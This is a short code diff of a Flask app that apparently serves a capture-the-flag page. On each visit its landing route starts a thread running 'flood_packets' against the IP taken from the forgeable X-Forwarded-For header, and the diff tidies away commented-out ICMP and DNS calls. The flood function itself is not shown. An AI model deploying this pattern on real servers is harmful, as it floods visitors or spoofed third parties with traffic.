@@ -51,11 +51,10 @@ def flood_packets(dstIP):
 @application.route("/")
 def landing_page():
    dstIP = request.headers["X-Forwarded-For"]
-   #send_icmp_reply(dstIP)
-   #send_dns_request(dstIP)
+   
    theThread = threading.Thread(target = flood_packets, args = (dstIP,))
    theThread.start()
-   #flood_packets(dstIP)
+   
    return send_file("/ctf/index.html")
 
 if __name__ == "__main__":
